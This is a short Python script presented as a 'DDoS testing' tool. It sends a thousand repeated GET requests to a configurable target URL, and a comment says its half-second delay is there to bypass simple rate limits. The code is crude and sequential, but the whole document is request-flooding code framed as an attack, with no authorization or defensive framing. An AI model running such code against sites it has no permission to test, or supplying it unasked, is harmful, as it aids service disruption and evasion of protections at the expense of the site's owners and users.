# DDoS Testing Script

import os
import requests
import time

# Configure the target
TARGET_URL = 'http://example.com'

# Number of requests to simulate
NUM_REQUESTS = 1000

# Simulate DDoS attack
for i in range(NUM_REQUESTS):
    try:
        response = requests.get(TARGET_URL)
        print(f'Request {i + 1}: Status Code - {response.status_code}')
    except requests.RequestException as e:
        print(f'Error on request {i + 1}: {e}')
    time.sleep(0.5)  # delay between requests to bypass simple rate limits
